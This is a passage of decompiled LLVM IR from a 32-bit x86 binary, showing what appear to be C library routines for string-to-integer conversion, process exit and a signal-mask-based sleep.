  %v6_80545d114 = and i8 %v5_80545d113, 32
  %v7_80545d115 = icmp eq i8 %v6_80545d114, 0
  %v1_80545d516 = icmp eq i1 %v7_80545d115, false
  br i1 %v1_80545d516, label %dec_label_pc_80545cd, label %dec_label_pc_80545d7

dec_label_pc_80545cd:                             ; preds = %dec_label_pc_80545b4, %dec_label_pc_80545cd
  %v0_80545cd = phi i32 [ %v1_80545cd, %dec_label_pc_80545cd ], [ %v4_80545c1, %dec_label_pc_80545b4 ]
  %v1_80545cd = add i32 %v0_80545cd, 1
  store i32 %v1_80545cd, i32* %ebx.global-to-local, align 4
  %v1_80545ce = inttoptr i32 %v1_80545cd to i8*
  %v2_80545ce = load i8, i8* %v1_80545ce, align 1
  %v3_80545ce = sext i8 %v2_80545ce to i32
  store i32 %v3_80545ce, i32* %eax.global-to-local, align 4
  %v2_80545d1 = mul nsw i32 %v3_80545ce, 2
  %v3_80545d1 = add i32 %v2_80545d1, %v0_80545bb
  %v4_80545d1 = inttoptr i32 %v3_80545d1 to i8*
  %v5_80545d1 = load i8, i8* %v4_80545d1, align 1
  %v6_80545d1 = and i8 %v5_80545d1, 32
  %v7_80545d1 = icmp eq i8 %v6_80545d1, 0
  %v1_80545d5 = icmp eq i1 %v7_80545d1, false
  br i1 %v1_80545d5, label %dec_label_pc_80545cd, label %dec_label_pc_80545d7

dec_label_pc_80545d7:                             ; preds = %dec_label_pc_80545cd, %dec_label_pc_80545b4
  %v0_80545ec = phi i32 [ %v4_80545c1, %dec_label_pc_80545b4 ], [ %v1_80545cd, %dec_label_pc_80545cd ]
  %v4_8054605 = phi i32 [ %v3_80545ce8, %dec_label_pc_80545b4 ], [ %v3_80545ce, %dec_label_pc_80545cd ]
  %v9_80545d7 = icmp eq i32 %v4_8054605, 43
  br i1 %v9_80545d7, label %dec_label_pc_80545ec, label %dec_label_pc_80545dc

dec_label_pc_80545dc:                             ; preds = %dec_label_pc_80545d7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_80545de = icmp eq i32 %v4_8054605, 45
  %v1_80545e1 = icmp eq i1 %v9_80545de, false
  br i1 %v1_80545e1, label %dec_label_pc_80545ed, label %dec_label_pc_80545ec

dec_label_pc_80545ec:                             ; preds = %dec_label_pc_80545d7, %dec_label_pc_80545dc
  %storemerge2 = phi i32 [ 1, %dec_label_pc_80545dc ], [ 0, %dec_label_pc_80545d7 ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_80545ec = add i32 %v0_80545ec, 1
  store i32 %v1_80545ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80545ed

dec_label_pc_80545ed:                             ; preds = %dec_label_pc_80545dc, %dec_label_pc_80545ec
  %v0_80545ff = phi i32 [ %v0_80545ec, %dec_label_pc_80545dc ], [ %v1_80545ec, %dec_label_pc_80545ec ]
  %v1_80545ef = and i32 %arg3, -17
  %v2_80545ef = icmp eq i32 %v1_80545ef, 0
  %v1_80545f5 = icmp eq i1 %v2_80545ef, false
  br i1 %v1_80545f5, label %dec_label_pc_805461b, label %dec_label_pc_80545f7

dec_label_pc_80545f7:                             ; preds = %dec_label_pc_80545ed
  %v1_80545f7 = add i32 %arg3, 10
  store i32 %v1_80545f7, i32* %esi.global-to-local, align 4
  %v1_80545fa = inttoptr i32 %v0_80545ff to i8*
  %v2_80545fa = load i8, i8* %v1_80545fa, align 1
  %v8_80545fa = icmp eq i8 %v2_80545fa, 48
  %v1_80545fd = icmp eq i1 %v8_80545fa, false
  br i1 %v1_80545fd, label %dec_label_pc_8054611, label %dec_label_pc_80545ff

dec_label_pc_80545ff:                             ; preds = %dec_label_pc_80545f7
  %v1_80545ff = add i32 %v0_80545ff, 1
  store i32 %v1_80545ff, i32* %ebx.global-to-local, align 4
  %v1_8054600 = add i32 %arg3, 8
  store i32 %v1_8054600, i32* %esi.global-to-local, align 4
  %v1_8054605 = inttoptr i32 %v1_80545ff to i8*
  %v2_8054605 = load i8, i8* %v1_8054605, align 1
  %v3_8054605 = zext i8 %v2_8054605 to i32
  %v5_8054605 = and i32 %v4_8054605, -256
  %v6_8054605 = or i32 %v5_8054605, %v3_8054605
  %v1_8054607 = or i32 %v6_8054605, 32
  %v3_8054607 = trunc i32 %v1_8054607 to i8
  store i32 %v1_8054607, i32* %eax.global-to-local, align 4
  %v10_805460a = icmp eq i8 %v3_8054607, 120
  %v1_805460c = icmp eq i1 %v10_805460a, false
  br i1 %v1_805460c, label %dec_label_pc_8054611, label %dec_label_pc_805460e

dec_label_pc_805460e:                             ; preds = %dec_label_pc_80545ff
  %v2_805460e = mul i32 %v1_8054600, 2
  store i32 %v2_805460e, i32* %esi.global-to-local, align 4
  %v1_8054610 = add i32 %v0_80545ff, 2
  store i32 %v1_8054610, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054611

dec_label_pc_8054611:                             ; preds = %dec_label_pc_80545ff, %dec_label_pc_80545f7, %dec_label_pc_805460e
  %v0_805463a25 = phi i32 [ %v1_80545ff, %dec_label_pc_80545ff ], [ %v0_80545ff, %dec_label_pc_80545f7 ], [ %v1_8054610, %dec_label_pc_805460e ]
  %v0_805469133 = phi i32 [ %v1_80545ff, %dec_label_pc_80545ff ], [ %v4_80545c1, %dec_label_pc_80545f7 ], [ %v1_80545ff, %dec_label_pc_805460e ]
  %v0_8054611 = phi i32 [ %v1_8054600, %dec_label_pc_80545ff ], [ %v1_80545f7, %dec_label_pc_80545f7 ], [ %v2_805460e, %dec_label_pc_805460e ]
  %v7_8054614 = icmp sgt i32 %v0_8054611, 16
  br i1 %v7_8054614, label %dec_label_pc_805461b.thread, label %dec_label_pc_805461b

dec_label_pc_805461b.thread:                      ; preds = %dec_label_pc_8054611
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054625

dec_label_pc_805461b:                             ; preds = %dec_label_pc_8054611, %dec_label_pc_80545ed
  %v0_805469134 = phi i32 [ %v0_805469133, %dec_label_pc_8054611 ], [ %v4_80545c1, %dec_label_pc_80545ed ]
  %v0_805463a26 = phi i32 [ %v0_805463a25, %dec_label_pc_8054611 ], [ %v0_80545ff, %dec_label_pc_80545ed ]
  %v0_805462a = phi i32 [ %v0_8054611, %dec_label_pc_8054611 ], [ %arg3, %dec_label_pc_80545ed ]
  %v1_805461b = add i32 %v0_805462a, -2
  store i32 %v1_805461b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8054623 = icmp ugt i32 %v1_805461b, 34
  br i1 %v6_8054623, label %dec_label_pc_8054686, label %dec_label_pc_8054625

dec_label_pc_8054625:                             ; preds = %dec_label_pc_805461b.thread, %dec_label_pc_805461b
  %v0_805462a58 = phi i32 [ 16, %dec_label_pc_805461b.thread ], [ %v0_805462a, %dec_label_pc_805461b ]
  %v0_805463a2657 = phi i32 [ %v0_805463a25, %dec_label_pc_805461b.thread ], [ %v0_805463a26, %dec_label_pc_805461b ]
  %v0_80546913456 = phi i32 [ %v0_805469133, %dec_label_pc_805461b.thread ], [ %v0_805469134, %dec_label_pc_805461b ]
  %div = udiv i32 -1, %v0_805462a58
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp51 = urem i32 -1, %v0_805462a58
  %v1_805462c = trunc i32 %tmp51 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8054666 = urem i32 %arg4, 256
  br label %dec_label_pc_805463a

dec_label_pc_8054638:                             ; preds = %dec_label_pc_805467c, %dec_label_pc_8054666
  %v4_805463a.pre = phi i32 [ %v1_8054650, %dec_label_pc_805467c ], [ %v4_805463a.pre.pre, %dec_label_pc_8054666 ]
  %v0_8054638 = phi i32 [ %v1_8054657, %dec_label_pc_805467c ], [ %v0_8054638.pre, %dec_label_pc_8054666 ]
  br label %dec_label_pc_805463a

dec_label_pc_805463a:                             ; preds = %dec_label_pc_8054625, %dec_label_pc_8054638
  %v0_805469132 = phi i32 [ %v0_80546913456, %dec_label_pc_8054625 ], [ %v0_8054638, %dec_label_pc_8054638 ]
  %v0_8054657 = phi i32 [ %v0_805463a2657, %dec_label_pc_8054625 ], [ %v0_8054638, %dec_label_pc_8054638 ]
  %v4_805463a = phi i32 [ %div, %dec_label_pc_8054625 ], [ %v4_805463a.pre, %dec_label_pc_8054638 ]
  %v1_805463a = inttoptr i32 %v0_8054657 to i8*
  %v2_805463a = load i8, i8* %v1_805463a, align 1
  %v3_805463a = zext i8 %v2_805463a to i32
  %v5_805463a = and i32 %v4_805463a, -256
  %v6_805463a = or i32 %v3_805463a, %v5_805463a
  store i32 %v6_805463a, i32* %eax.global-to-local, align 4
  %v1_805463c = add i32 %v6_805463a, -48
  %v1_805463f = trunc i32 %v1_805463c to i8
  %tmp59 = icmp ult i8 %v1_805463f, 10
  br i1 %tmp59, label %dec_label_pc_8054650, label %dec_label_pc_8054644

dec_label_pc_8054644:                             ; preds = %dec_label_pc_805463a
  %v1_8054644 = or i32 %v6_805463a, 32
  %v3_8054644 = trunc i32 %v1_8054644 to i8
  store i32 %v1_8054644, i32* %eax.global-to-local, align 4
  %v1_8054647 = and i32 %v1_805463c, -256
  %v2_8054647 = or i32 %v1_8054647, 40
  %tmp60 = icmp ult i8 %v3_8054644, 97
  br i1 %tmp60, label %dec_label_pc_8054650, label %dec_label_pc_805464d

dec_label_pc_805464d:                             ; preds = %dec_label_pc_8054644
  %v1_805464d = add i32 %v1_8054644, -87
  br label %dec_label_pc_8054650

dec_label_pc_8054650:                             ; preds = %dec_label_pc_8054644, %dec_label_pc_805463a, %dec_label_pc_805464d
  %v0_805467f = phi i32 [ %v2_8054647, %dec_label_pc_8054644 ], [ %v1_805463c, %dec_label_pc_805463a ], [ %v1_805464d, %dec_label_pc_805464d ]
  %v1_8054650 = urem i32 %v0_805467f, 256
  store i32 %v1_8054650, i32* %eax.global-to-local, align 4
  %v1_8054653 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054653 = sub i32 %v1_8054650, %v1_8054653
  %v10_8054653 = and i32 %v2_8054653, %v1_8054653
  %v11_8054653 = icmp slt i32 %v10_8054653, 0
  %v13_8054653 = icmp slt i32 %v2_8054653, 0
  %v2_8054655 = icmp eq i1 %v13_8054653, %v11_8054653
  br i1 %v2_8054655, label %dec_label_pc_8054686, label %dec_label_pc_8054657

dec_label_pc_8054657:                             ; preds = %dec_label_pc_8054650
  %v1_8054657 = add i32 %v0_8054657, 1
  store i32 %v1_8054657, i32* %ebx.global-to-local, align 4
  %v0_8054658 = load i32, i32* %edx.global-to-local, align 4
  %tmp61 = icmp ugt i32 %v0_8054658, %div
  br i1 %tmp61, label %dec_label_pc_8054666, label %dec_label_pc_805465e

dec_label_pc_805465e:                             ; preds = %dec_label_pc_8054657
  %v15_8054658 = icmp eq i32 %v0_8054658, %div
  %v1_805465e = icmp eq i1 %v15_8054658, false
  br i1 %v1_805465e, label %dec_label_pc_805467c, label %dec_label_pc_8054660

dec_label_pc_8054660:                             ; preds = %dec_label_pc_805465e
  %v1_8054660 = trunc i32 %v0_805467f to i8
  %tmp62 = icmp ugt i8 %v1_8054660, %v1_805462c
  br i1 %tmp62, label %dec_label_pc_8054666, label %dec_label_pc_805467c

dec_label_pc_8054666:                             ; preds = %dec_label_pc_8054660, %dec_label_pc_8054657
  store i32 %v4_8054666, i32* %eax.global-to-local, align 4
  %v0_805466a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805466a = and i32 %v0_805466a, %v4_8054666
  store i32 %v2_805466a, i32* %ebp.global-to-local, align 4
  %v1_805466c = call i32 @function_80530b9(i32 %div)
  store i32 %v1_805466c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8054674 = inttoptr i32 %v1_805466c to i32*
  store i32 34, i32* %v1_8054674, align 4
  %v0_8054638.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805463a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054638

dec_label_pc_805467c:                             ; preds = %dec_label_pc_8054660, %dec_label_pc_805465e
  %v4_805467c = mul i32 %v0_8054658, %v1_8054653
  store i32 %v1_8054650, i32* %eax.global-to-local, align 4
  %v2_8054682 = add i32 %v4_805467c, %v1_8054650
  store i32 %v2_8054682, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054638

dec_label_pc_8054686:                             ; preds = %dec_label_pc_8054650, %dec_label_pc_805461b
  %v0_8054691 = phi i32 [ %v0_805469134, %dec_label_pc_805461b ], [ %v0_805469132, %dec_label_pc_8054650 ]
  %stack_var_-24.0 = phi i32 [ %tmp41, %dec_label_pc_805461b ], [ %div, %dec_label_pc_8054650 ]
  %v4_8054686 = icmp eq i32 %arg2, 0
  br i1 %v4_8054686, label %dec_label_pc_8054693, label %dec_label_pc_805468d

dec_label_pc_805468d:                             ; preds = %dec_label_pc_8054686
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8054691 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8054691, i32* %v2_8054691, align 4
  br label %dec_label_pc_8054693

dec_label_pc_8054693:                             ; preds = %dec_label_pc_8054686, %dec_label_pc_805468d
  %v0_8054693 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8054693, i32* %eax.global-to-local, align 4
  %v1_8054695 = trunc i32 %v0_8054693 to i8
  %v6_8054695 = icmp eq i8 %v1_8054695, 0
  %v2_8054697 = zext i1 %v6_8054695 to i32
  %v1_80546993 = or i32 %v2_8054697, -2147483648
  store i32 %v1_80546993, i32* %ebx.global-to-local, align 4
  %v5_805469f = icmp eq i8 %tmp, 0
  br i1 %v5_805469f, label %dec_label_pc_80546b7, label %dec_label_pc_80546a6

dec_label_pc_80546a6:                             ; preds = %dec_label_pc_8054693
  %v0_80546a6 = load i32, i32* %edx.global-to-local, align 4
  %tmp63 = icmp ugt i32 %v0_80546a6, %v1_80546993
  br i1 %tmp63, label %dec_label_pc_80546aa, label %dec_label_pc_80546b7

dec_label_pc_80546aa:                             ; preds = %dec_label_pc_80546a6
  %v1_80546aa = call i32 @function_80530b9(i32 %stack_var_-24.0)
  store i32 %v1_80546aa, i32* %eax.global-to-local, align 4
  %v0_80546af = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80546af, i32* %edx.global-to-local, align 4
  %v1_80546b1 = inttoptr i32 %v1_80546aa to i32*
  store i32 34, i32* %v1_80546b1, align 4
  %v0_80546b7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80546b7

dec_label_pc_80546b7:                             ; preds = %dec_label_pc_80546a6, %dec_label_pc_8054693, %dec_label_pc_80546aa
  %v0_80546b7 = phi i32 [ %v0_8054693, %dec_label_pc_80546a6 ], [ %v0_8054693, %dec_label_pc_8054693 ], [ %v0_80546b7.pre, %dec_label_pc_80546aa ]
  store i32 %v0_80546b7, i32* %eax.global-to-local, align 4
  %v3_80546b9 = trunc i32 %v0_80546b7 to i8
  %v4_80546b9 = icmp eq i8 %v3_80546b9, 0
  %v0_80546c2.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_80546b9, label %dec_label_pc_80546bf, label %dec_label_pc_80546bd

dec_label_pc_80546bd:                             ; preds = %dec_label_pc_80546b7
  %v1_80546bd = sub i32 0, %v0_80546c2.pre
  store i32 %v1_80546bd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80546bf

dec_label_pc_80546bf:                             ; preds = %dec_label_pc_80546b7, %dec_label_pc_80546bd
  %v0_80546c2 = phi i32 [ %v1_80546bd, %dec_label_pc_80546bd ], [ %v0_80546c2.pre, %dec_label_pc_80546b7 ]
  store i32 %v0_80546c2, i32* %eax.global-to-local, align 4
  %v2_80546c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80546c4, i32* @ebx, align 4
  ret i32 %v0_80546c2

; uselistorder directives
  uselistorder i32 %v0_80546c2, { 1, 0 }
  uselistorder i32 %v0_80546b7, { 1, 0 }
  uselistorder i32 %v0_8054658, { 0, 2, 1 }
  uselistorder i32 %v1_8054657, { 1, 0 }
  uselistorder i32 %v2_8054653, { 1, 0 }
  uselistorder i32 %v1_8054650, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805467f, { 1, 0 }
  uselistorder i32 %v0_8054638, { 1, 0 }
  uselistorder i32 %v4_8054666, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_805462a58, { 1, 0 }
  uselistorder i32 %v0_805469134, { 1, 0 }
  uselistorder i32 %v2_805460e, { 1, 0 }
  uselistorder i32 %v1_8054607, { 1, 0 }
  uselistorder i32 %v1_8054600, { 1, 0, 2 }
  uselistorder i32 %v0_80545ff, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8054605, { 2, 0, 1 }
  uselistorder i32 %v1_80545cd, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80545c1, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 17, 14, 15, 16 }
  uselistorder i8 10, { 0, 1, 2, 3, 6, 5, 4, 7, 12, 9, 10, 13, 11, 8 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80546bf, { 1, 0 }
  uselistorder label %dec_label_pc_80546b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054693, { 1, 0 }
  uselistorder label %dec_label_pc_8054650, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805463a, { 1, 0 }
  uselistorder label %dec_label_pc_8054625, { 1, 0 }
  uselistorder label %dec_label_pc_8054611, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545ed, { 1, 0 }
  uselistorder label %dec_label_pc_80545ec, { 1, 0 }
  uselistorder label %dec_label_pc_80545cd, { 1, 0 }
}

define i32 @function_80546c9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80546c9:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80546dc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80546dc, i32* @ebx, align 4
  %v2_80546e1 = call i32 @function_8054a40(i32 %v2_80546dc, i32 134564413)
  %v1_80546ed = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571d0.230 to i32))
  %v0_80546f2 = load i32, i32* @global_var_80572b8.231, align 8
  store i32 %v0_80546f2, i32* @eax, align 4
  %v1_80546fa = icmp eq i32 %v0_80546f2, 0
  br i1 %v1_80546fa, label %dec_label_pc_8054707, label %dec_label_pc_80546fe

dec_label_pc_80546fe:                             ; preds = %dec_label_pc_80546c9
  %v0_8054701 = load i32, i32* @esi, align 4
  %v1_8054702 = call i32 @unknown_0(i32 %v0_8054701)
  store i32 %v1_8054702, i32* @eax, align 4
  br label %dec_label_pc_8054707

dec_label_pc_8054707:                             ; preds = %dec_label_pc_80546c9, %dec_label_pc_80546fe
  %v2_805470c = call i32 @function_8054a40(i32 %v2_80546dc, i32 1)
  %v0_8054711 = call i32 @function_80549fe()
  %v0_805472a = load i32, i32* @esi, align 4
  %v1_805472b = call i32 @function_8054de0(i32 %v0_805472a)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8054de0, { 1, 0 }
  uselistorder i32 (i32)* @function_8054a3d, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_8054a40, { 8, 7, 6, 5, 13, 12, 4, 0, 3, 1, 11, 10, 9, 2 }
  uselistorder label %dec_label_pc_8054707, { 1, 0 }
}

define i32 @function_8054730(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054730:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8054730 = load i32, i32* @ebp, align 4
  %v0_8054731 = load i32, i32* @edi, align 4
  %v0_8054732 = load i32, i32* @esi, align 4
  %v0_8054733 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8054746 = icmp eq i32 %arg1, 0
  %v1_8054748 = icmp eq i1 %v1_8054746, false
  br i1 %v1_8054748, label %dec_label_pc_805474f.lr.ph, label %dec_label_pc_80548a7

dec_label_pc_805474f.lr.ph:                       ; preds = %dec_label_pc_8054730
  %v15_8054734 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805474f56 = add i32 %v15_8054734, 416
  %v5_805474f57 = inttoptr i32 %v4_805474f56 to i32*
  store i32 0, i32* %v5_805474f57, align 4
  %v0_805475a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_805475a59 = add i32 %v0_805475a58, -1
  %v9_805475a60 = icmp slt i32 %v1_805475a59, 0
  store i32 %v1_805475a59, i32* %eax.global-to-local, align 4
  %v1_805475b61 = icmp eq i1 %v9_805475a60, false
  br i1 %v1_805475b61, label %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge, label %dec_label_pc_805475d

dec_label_pc_805474f.dec_label_pc_805474f_crit_edge: ; preds = %dec_label_pc_805474f.lr.ph, %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge
  %v1_805475a62 = phi i32 [ %v1_805475a, %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge ], [ %v1_805475a59, %dec_label_pc_805474f.lr.ph ]
  %v0_805474f.pre = load i32, i32* @esp, align 4
  %v2_805474f = mul i32 %v1_805475a62, 4
  %v3_805474f = add i32 %v0_805474f.pre, 292
  %v4_805474f = add i32 %v3_805474f, %v2_805474f
  %v5_805474f = inttoptr i32 %v4_805474f to i32*
  store i32 0, i32* %v5_805474f, align 4
  %v0_805475a = load i32, i32* %eax.global-to-local, align 4
  %v1_805475a = add i32 %v0_805475a, -1
  %v9_805475a = icmp slt i32 %v1_805475a, 0
  store i32 %v1_805475a, i32* %eax.global-to-local, align 4
  %v1_805475b = icmp eq i1 %v9_805475a, false
  br i1 %v1_805475b, label %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge, label %dec_label_pc_805475d

dec_label_pc_805475d:                             ; preds = %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge, %dec_label_pc_805474f.lr.ph
  %v1_805475a.lcssa = phi i32 [ %v1_805475a59, %dec_label_pc_805474f.lr.ph ], [ %v1_805475a, %dec_label_pc_805474f.dec_label_pc_805474f_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8054773 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8054773, i32* @ebx, align 4
  store i32 %v2_8054773, i32* %stack_var_-460, align 4
  %v4_805477b = call i32 @function_80534ce(i32 %v2_8054773, i32 17, i32 %v1_805475a.lcssa, i32 %v1_805475a.lcssa)
  store i32 %v4_805477b, i32* %eax.global-to-local, align 4
  %v2_8054783 = icmp slt i32 %v4_805477b, 0
  br i1 %v2_8054783, label %dec_label_pc_80548ab, label %dec_label_pc_805478b

dec_label_pc_805478b:                             ; preds = %dec_label_pc_805475d
  %v2_805478c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_805478c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8054797 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8054797 = call i32 @function_8052ded(i32 0, %_TYPEDEF_sigset_t* %v3_8054797, i32 %v2_805478c)
  store i32 %v4_8054797, i32* %eax.global-to-local, align 4
  %v1_805479f = icmp eq i32 %v4_8054797, 0
  %v1_80547a1 = icmp eq i1 %v1_805479f, false
  br i1 %v1_80547a1, label %dec_label_pc_80548ab, label %dec_label_pc_80547a7

dec_label_pc_80547a7:                             ; preds = %dec_label_pc_805478b
  store i32 %v2_805478c, i32* %stack_var_-460, align 4
  %v4_80547ac = call i32 @function_80534aa(i32 %v2_805478c, i32 17, i32 %v4_8054797, i32 %v4_8054797)
  store i32 %v4_80547ac, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80547b9 = icmp eq i32 %v4_80547ac, 0
  br i1 %v1_80547b9, label %dec_label_pc_80547c2.lr.ph, label %dec_label_pc_8054875

dec_label_pc_80547c2.lr.ph:                       ; preds = %dec_label_pc_80547a7
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_805474f57, align 4
  %v0_80547cd50 = load i32, i32* %edx.global-to-local, align 4
  %v1_80547cd51 = add i32 %v0_80547cd50, -1
  %v9_80547cd52 = icmp slt i32 %v1_80547cd51, 0
  store i32 %v1_80547cd51, i32* %edx.global-to-local, align 4
  %v1_80547ce53 = icmp eq i1 %v9_80547cd52, false
  br i1 %v1_80547ce53, label %dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge, label %dec_label_pc_80547d0

dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge: ; preds = %dec_label_pc_80547c2.lr.ph, %dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge
  %v1_80547cd54 = phi i32 [ %v1_80547cd, %dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge ], [ %v1_80547cd51, %dec_label_pc_80547c2.lr.ph ]
  %v0_80547c2.pre = load i32, i32* @esp, align 4
  %v2_80547c2 = mul i32 %v1_80547cd54, 4
  %v3_80547c2 = add i32 %v0_80547c2.pre, 292
  %v4_80547c2 = add i32 %v3_80547c2, %v2_80547c2
  %v5_80547c2 = inttoptr i32 %v4_80547c2 to i32*
  store i32 0, i32* %v5_80547c2, align 4
  %v0_80547cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80547cd = add i32 %v0_80547cd, -1
  %v9_80547cd = icmp slt i32 %v1_80547cd, 0
  store i32 %v1_80547cd, i32* %edx.global-to-local, align 4
  %v1_80547ce = icmp eq i1 %v9_80547cd, false
  br i1 %v1_80547ce, label %dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge, label %dec_label_pc_80547d0

dec_label_pc_80547d0:                             ; preds = %dec_label_pc_80547c2.dec_label_pc_80547c2_crit_edge, %dec_label_pc_80547c2.lr.ph
  store i32 %v2_8054773, i32* %eax.global-to-local, align 4
  store i32 %v2_8054773, i32* %stack_var_-460, align 4
  %v4_80547dc = call i32 @function_80534ce(i32 %v2_8054773, i32 17, i32 0, i32 0)
  store i32 %v4_80547dc, i32* %eax.global-to-local, align 4
  %v2_80547e4 = icmp slt i32 %v4_80547dc, 0
  br i1 %v2_80547e4, label %dec_label_pc_80548ab, label %dec_label_pc_80547ec

dec_label_pc_80547ec:                             ; preds = %dec_label_pc_80547d0
  %v2_80547ed = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80547ed, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80547f6 = call i32 @function_8054c7f(i32 17, i32* null, i32 %v2_80547ed)
  store i32 %v4_80547f6, i32* %eax.global-to-local, align 4
  %v2_80547fe = icmp slt i32 %v4_80547f6, 0
  %v1_8054800 = icmp eq i1 %v2_80547fe, false
  br i1 %v1_8054800, label %dec_label_pc_805482a, label %dec_label_pc_8054802

dec_label_pc_8054802:                             ; preds = %dec_label_pc_80547ec
  %v0_8054802 = load i32, i32* %stack_var_-460, align 4
  %v1_8054802 = call i32 @function_80530b9(i32 %v0_8054802)
  store i32 %v1_8054802, i32* %eax.global-to-local, align 4
  store i32 %v1_8054802, i32* @ebx, align 4
  %v1_8054809 = inttoptr i32 %v1_8054802 to i32*
  %v2_8054809 = load i32, i32* %v1_8054809, align 4
  store i32 %v2_8054809, i32* @esi, align 4
  store i32 %v2_805478c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054818 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054818 = call i32 @function_8052ded(i32 2, %_TYPEDEF_sigset_t* %v3_8054818, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054823 = load i32, i32* @esi, align 4
  %v1_8054823 = load i32, i32* @ebx, align 4
  %v2_8054823 = inttoptr i32 %v1_8054823 to i32*
  store i32 %v0_8054823, i32* %v2_8054823, align 4
  %v0_80548b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ae

dec_label_pc_805482a:                             ; preds = %dec_label_pc_80547ec
  %v3_805482a = load i32, i32* %stack_var_-420, align 4
  %v12_805482a = icmp eq i32 %v3_805482a, 1
  %v2_8054836 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054836, i32* @ebx, align 4
  %v1_805483d = icmp eq i1 %v12_805482a, false
  br i1 %v1_805483d, label %dec_label_pc_8054864, label %dec_label_pc_805483f

dec_label_pc_805483f:                             ; preds = %dec_label_pc_805482a
  %v0_805483f = load i32, i32* @edi, align 4
  store i32 %v2_8054836, i32* %stack_var_-460, align 4
  %v4_8054843 = bitcast i32* %stack_var_-24 to %timespec*
